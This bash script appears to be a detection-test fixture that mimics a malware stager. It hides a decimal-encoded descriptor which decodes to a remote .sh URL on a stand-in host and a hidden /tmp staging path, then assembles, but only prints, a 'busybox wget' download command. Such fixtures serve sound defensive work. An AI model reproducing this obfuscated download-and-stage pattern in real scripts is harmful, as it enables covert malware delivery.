#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_a1e283dd='118,61,49,124,115,116,101,112,115,61,97,99,113,117,105,114,101,95,114,101,109,111,116,101,44,119,114,105,116,101,95,102,105,108,101,124,97,100,97,112,116,101,114,61,98,117,115,121,98,111,120,95,119,103,101,116,95,111,117,116,112,117,116,124,115,116,97,103,101,95,99,111,117,110,116,61,49,124,99,97,109,112,97,105,103,110,95,105,100,61,99,97,109,112,97,105,103,110,45,50,97,101,57,101,53,97,56,56,101,124,117,114,108,61,104,116,116,112,115,58,47,47,50,97,101,57,101,53,97,56,56,101,46,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100,47,49,99,53,97,51,48,56,100,46,115,104,124,117,115,101,114,95,97,103,101,110,116,61,72,117,110,116,114,101,115,115,76,97,98,47,50,97,101,57,101,53,97,56,56,101,124,102,105,108,101,95,112,97,116,104,61,47,116,109,112,47,104,117,110,116,114,101,115,115,45,99,97,99,104,101,47,46,115,116,97,103,101,45,50,97,101,57,101,53,97,56,56,101'

readonly Codec_a1e283dd='decimal_comma|identity|'



Load_a1e283dd() {

  e=()

  local IFS=','

  read -r -a e <<< "${Material_a1e283dd}"

}



Decode_a1e283dd() {

  d=()

  local i

  for ((i=0; i<${#e[@]}; i++)); do

    d+=("${e[i]}")

  done

}



Recover_a1e283dd() {

  local -a e d

  local t n z i

  n=''

  Load_a1e283dd

  local decode_target=Decode_a1e283dd; "$decode_target"

  t=''

  local octal character

  for i in "${!d[@]}"; do

    printf -v octal '%03o' "${d[i]}"

    printf -v character '%b' "\\$octal"

    t+="$character"

  done

  printf '%s\n' "$t"

}



Inspect_a1e283dd() { Recover_a1e283dd; }



Plan_a1e283dd() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_a1e283dd)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(busybox wget -qO "$file_path" "$url")

  declare -p request_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_a1e283dd; fi

